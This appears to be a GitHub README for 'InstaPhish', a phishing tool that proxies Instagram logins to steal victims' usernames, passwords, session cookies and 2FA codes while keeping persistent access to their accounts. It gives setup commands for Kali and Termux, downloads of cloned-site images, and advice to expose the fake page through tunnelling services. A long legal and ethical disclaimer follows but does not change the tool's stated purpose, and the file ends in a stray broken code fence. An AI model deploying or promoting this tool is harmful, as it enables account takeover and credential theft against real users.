# ⚡ InstaPhish v3.0

> Instagram Session Hijacking via EvilGinx2-Style MITM Proxy  
> Author: **r4tur1**  
> Platform: Kali Linux / Termux (Android)

---

## 💀 What It Does

InstaPhish intercepts Instagram login requests in real-time using a reverse proxy with SSL stripping. It captures:

- Username & Encrypted Password  
- Session Cookies (`sessionid`, `csrftoken`, `rur`, `mid`)  
- 2FA Verification Codes  
- Browser Fingerprint & IP  

Victim is seamlessly logged into their real Instagram session while you retain persistent access.

---

## 🛠️ Installation

### 🐧 Kali Linux

```bash
git clone https://github.com/r4tur1/InstaPhish.git
cd InstaPhish
chmod +x setup.sh
bash setup.sh

pip3 install flask requests beautifulsoup4 cryptography pyOpenSSL

# Start InstaPhish
python3 instaphish.py
cd ~/InstaPhish

# Create a temp directory and clone just the images
mkdir -p /tmp/insta_images

# Download each image directly from your GitHub repo
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/facebook.png
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/google-play.png
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/insta_logo.png
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/microsoft.png
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/phones.png
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/ss1.png
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/ss2.png
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/ss3.png
wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/title.jpg

# Verify
ls -la cloned_site/images/
````

> Use tools like ngrok, cloudflared, or serveo to expose to the internet.

---

### 📱 Termux (Android)

```bash
pkg update && pkg upgrade
pkg install git python php openssl-tool wget curl

git clone https://github.com/r4tur1/InstaPhish.git
cd InstaPhish

bash setup.sh
```

---

## ⚠️ Legal & Ethical Notice

This project is intended **strictly for defensive security research, education, and authorized testing**.

By using this software, you agree to the following:

* You will **only use it on systems you own** or have **explicit, written permission** to test
* You will **not use this tool to access, intercept, or manipulate data** belonging to others without consent
* You understand that unauthorized testing may violate **local, national, or international laws**
* The author and contributors **accept no liability** for misuse, damage, or legal consequences arising from use of this software

---

## 🛡️ Responsible Use

This repository is designed to:

* Help defenders understand attack techniques in a **controlled lab environment**
* Support **security awareness training**
* Aid in building **detection and mitigation strategies**

---

## ❌ Prohibited Use

You must **not** use this project for:

* Unauthorized access to accounts or systems
* Credential harvesting or impersonation
* Social engineering attacks against real users without consent
* Any activity that violates laws or platform terms of service

---

## 📜 License & Compliance

This project is provided **"as is"**, without warranty of any kind.
Use is subject to applicable laws and regulations in your jurisdiction.

If you are unsure whether your use is legal, **do not proceed**.

---

## 📢 Reporting Issues

If you discover a vulnerability while using this project in a legitimate environment, follow **responsible disclosure practices** and report it to the affected service provider.

---

## 🤝 Ethical Security

Security research should **protect users, not harm them**.
Always prioritize consent, transparency, and legality.

```formatting does)
```
